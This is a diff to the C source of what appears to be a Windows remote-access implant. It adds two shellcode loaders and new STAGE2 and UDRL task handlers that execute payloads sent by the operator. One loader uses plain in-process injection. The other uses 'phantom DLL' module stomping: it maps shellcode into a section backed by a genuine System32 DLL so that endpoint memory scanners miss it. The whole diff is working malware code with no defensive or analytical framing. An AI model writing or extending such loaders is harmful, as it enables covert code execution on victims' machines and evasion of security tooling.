@@ -304,6 +304,140 @@ static void json_get_str(const char *json, const char *key, char *out, size_t ou
     out[i] = '\0';
 }
 
+// ── In-process shellcode execution (STAGE2) ──────────────────────────────────
+
+static char *inject_self(const uint8_t *sc, size_t sc_len) {
+    LPVOID mem = VirtualAlloc(NULL, sc_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+    if (!mem) { char *e=(char*)malloc(64); snprintf(e,64,"[-] VirtualAlloc failed %lu",GetLastError()); return e; }
+    memcpy(mem, sc, sc_len);
+    DWORD old;
+    VirtualProtect(mem, sc_len, PAGE_EXECUTE_READ, &old);
+    HANDLE ht = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
+    if (!ht) { VirtualFree(mem, 0, MEM_RELEASE); char *e=(char*)malloc(64); snprintf(e,64,"[-] CreateThread failed %lu",GetLastError()); return e; }
+    CloseHandle(ht);
+    char *out = (char*)malloc(128);
+    snprintf(out, 128, "[+] self-inject: %zu bytes \xe2\x86\x92 executing", sc_len);
+    return out;
+}
+
+// ── Phantom DLL / module stomping (UDRL) ─────────────────────────────────────
+//
+// Maps shellcode into a SEC_IMAGE-backed section (CoW).  From the VAD the pages
+// appear owned by a legitimate DLL on disk — defeats "unlinked memory" heuristics.
+
+typedef NTSTATUS (NTAPI *NtCreateSection_f)(PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
+typedef NTSTATUS (NTAPI *NtMapViewOfSection_f)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
+typedef NTSTATUS (NTAPI *NtUnmapViewOfSection_f)(HANDLE, PVOID);
+typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_f)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
+typedef NTSTATUS (NTAPI *NtCreateThreadEx_f)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
+
+typedef struct { USHORT Length, MaximumLength; PWSTR Buffer; } PL_UNICODE_STRING;
+typedef struct { ULONG Length; HANDLE Root; PL_UNICODE_STRING *Name; ULONG Attribs; PVOID SecDesc, SecQoS; } PL_OBJECT_ATTRIBUTES;
+typedef struct { union { NTSTATUS Status; PVOID Pointer; }; ULONG_PTR Info; } PL_IO_STATUS_BLOCK;
+
+/* NtOpenFile is exported from ntdll so GetProcAddress works */
+typedef NTSTATUS (NTAPI *NtOpenFile_f)(PHANDLE, ACCESS_MASK, PL_OBJECT_ATTRIBUTES*, PL_IO_STATUS_BLOCK*, ULONG, ULONG);
+typedef NTSTATUS (NTAPI *NtClose_f)(HANDLE);
+
+#ifndef OBJ_CASE_INSENSITIVE
+#define OBJ_CASE_INSENSITIVE 0x40UL
+#endif
+#define PL_SECTION_ALL_ACCESS 0x000F001FL
+#define PL_SEC_IMAGE          0x01000000UL
+#define PL_VIEW_SHARE         1UL
+#define PL_FILE_SYNC_IO       0x00000020UL
+#define PL_FILE_NON_DIR       0x00000040UL
+
+static char *phantom_load(const uint8_t *sc, size_t sc_len) {
+    /* Find host DLL */
+    char sysroot[MAX_PATH]; ExpandEnvironmentStringsA("%SystemRoot%", sysroot, MAX_PATH);
+    static const char *candidates[] = {
+        "\\System32\\xpsservices.dll",
+        "\\System32\\clbcatq.dll",
+        "\\System32\\msasn1.dll",
+        NULL
+    };
+    char hostPath[MAX_PATH] = "";
+    for (int i = 0; candidates[i]; i++) {
+        snprintf(hostPath, MAX_PATH, "%s%s", sysroot, candidates[i]);
+        if (GetFileAttributesA(hostPath) != INVALID_FILE_ATTRIBUTES) break;
+        hostPath[0] = '\0';
+    }
+    if (!hostPath[0]) return _strdup("[-] phantom_load: no host DLL found");
+
+    /* Resolve ntdll functions */
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    if (!ntdll) return _strdup("[-] phantom_load: ntdll not loaded");
+    NtOpenFile_f             pfnOpen   = (NtOpenFile_f)            GetProcAddress(ntdll, "NtOpenFile");
+    NtClose_f                pfnClose  = (NtClose_f)               GetProcAddress(ntdll, "NtClose");
+    NtCreateSection_f        pfnCS     = (NtCreateSection_f)       GetProcAddress(ntdll, "NtCreateSection");
+    NtMapViewOfSection_f     pfnMap    = (NtMapViewOfSection_f)    GetProcAddress(ntdll, "NtMapViewOfSection");
+    NtUnmapViewOfSection_f   pfnUnmap  = (NtUnmapViewOfSection_f)  GetProcAddress(ntdll, "NtUnmapViewOfSection");
+    NtProtectVirtualMemory_f pfnProt   = (NtProtectVirtualMemory_f)GetProcAddress(ntdll, "NtProtectVirtualMemory");
+    NtCreateThreadEx_f       pfnThread = (NtCreateThreadEx_f)      GetProcAddress(ntdll, "NtCreateThreadEx");
+    if (!pfnOpen || !pfnCS || !pfnMap || !pfnProt) return _strdup("[-] phantom_load: resolve failed");
+
+    /* NtOpenFile — NT namespace path \??\<drive:\path> */
+    char ntPathA[MAX_PATH + 8]; snprintf(ntPathA, sizeof(ntPathA), "\\??\\%s", hostPath);
+    int wlen = MultiByteToWideChar(CP_UTF8, 0, ntPathA, -1, NULL, 0);
+    WCHAR *wpath = (WCHAR*)malloc(wlen * 2);
+    if (!wpath) return _strdup("[-] phantom_load: alloc failed");
+    MultiByteToWideChar(CP_UTF8, 0, ntPathA, -1, wpath, wlen);
+    int nbytes = (wlen - 1) * 2;
+    PL_UNICODE_STRING ustr = { (USHORT)nbytes, (USHORT)(nbytes + 2), wpath };
+    PL_OBJECT_ATTRIBUTES oa = { sizeof(PL_OBJECT_ATTRIBUTES), NULL, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL };
+    PL_IO_STATUS_BLOCK isb = {0};
+    HANDLE fileH = NULL;
+    NTSTATUS st = pfnOpen(&fileH, GENERIC_READ | FILE_EXECUTE | SYNCHRONIZE, &oa, &isb,
+                          FILE_SHARE_READ | FILE_SHARE_DELETE, PL_FILE_SYNC_IO | PL_FILE_NON_DIR);
+    free(wpath);
+    if (st != 0 || !fileH) { char *e=(char*)malloc(64); snprintf(e,64,"[-] NtOpenFile: 0x%08lX",(unsigned long)st); return e; }
+
+    /* NtCreateSection SEC_IMAGE */
+    HANDLE secH = NULL;
+    NTSTATUS st2 = pfnCS(&secH, PL_SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, PL_SEC_IMAGE, fileH);
+    pfnClose(fileH);
+    if (st2 != 0 || !secH) { char *e=(char*)malloc(64); snprintf(e,64,"[-] NtCreateSection: 0x%08lX",(unsigned long)st2); return e; }
+
+    /* NtMapViewOfSection — CoW */
+    PVOID mappedBase = NULL; SIZE_T viewSize = 0;
+    NTSTATUS st3 = pfnMap(secH, GetCurrentProcess(), &mappedBase, 0, 0, NULL, &viewSize,
+                          PL_VIEW_SHARE, 0, PAGE_EXECUTE_WRITECOPY);
+    if (st3 != 0) {
+        mappedBase = NULL; viewSize = 0;
+        st3 = pfnMap(secH, GetCurrentProcess(), &mappedBase, 0, 0, NULL, &viewSize,
+                     PL_VIEW_SHARE, 0, PAGE_EXECUTE_READ);
+        if (st3 != 0) { pfnClose(secH); char *e=(char*)malloc(64); snprintf(e,64,"[-] NtMapViewOfSection: 0x%08lX",(unsigned long)st3); return e; }
+    }
+    pfnClose(secH);
+
+    SIZE_T writeSize = sc_len < viewSize ? sc_len : viewSize;
+
+    /* RW → CoW triggers → private pages */
+    ULONG oldProt = 0;
+    PVOID base2 = mappedBase; SIZE_T ws2 = writeSize;
+    pfnProt(GetCurrentProcess(), &base2, &ws2, PAGE_READWRITE, &oldProt);
+    memcpy(mappedBase, sc, writeSize);
+
+    /* RX — never RWX */
+    base2 = mappedBase; ws2 = writeSize;
+    pfnProt(GetCurrentProcess(), &base2, &ws2, PAGE_EXECUTE_READ, &oldProt);
+
+    /* Execute */
+    if (pfnThread) {
+        HANDLE hThr = NULL;
+        pfnThread(&hThr, 0x1FFFFF, NULL, GetCurrentProcess(), mappedBase, NULL, 0, 0, 0, 0, NULL);
+        if (hThr) CloseHandle(hThr);
+    } else {
+        HANDLE hThr = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mappedBase, NULL, 0, NULL);
+        if (hThr) CloseHandle(hThr);
+    }
+
+    char *out = (char*)malloc(256);
+    snprintf(out, 256, "[+] phantomLoad: host=%s mapped=0x%p sc=%zu B \xe2\x86\x92 executing", hostPath, mappedBase, sc_len);
+    return out;
+}
+
 // ── Process injection ─────────────────────────────────────────────────────────
 
 static char *inject_remote(int pid, const uint8_t *sc, size_t sc_len) {
@@ -1620,6 +1754,20 @@ void dispatch_task(AgentTask *task) {
                 agent_send_result(task->id, m, "");
             } else agent_send_result(task->id, "", "screenshot: read failed");
         } else agent_send_result(task->id, "", "screenshot: GDI capture failed");
+    }
+    else if (strcmp(type_upper, "STAGE2") == 0) {
+        if (!task->payload || task->payload_len == 0) {
+            agent_send_result(task->id, "", "STAGE2: no shellcode payload"); return;
+        }
+        char *out = inject_self(task->payload, task->payload_len);
+        agent_send_result(task->id, out, ""); free(out);
+    }
+    else if (strcmp(type_upper, "UDRL") == 0) {
+        if (!task->payload || task->payload_len == 0) {
+            agent_send_result(task->id, "", "UDRL: no shellcode payload"); return;
+        }
+        char *out = phantom_load(task->payload, task->payload_len);
+        agent_send_result(task->id, out, ""); free(out);
     }
     else if (strcmp(type_upper, "INJECT_REMOTE") == 0) {
         if (!task->payload || task->payload_len == 0) {
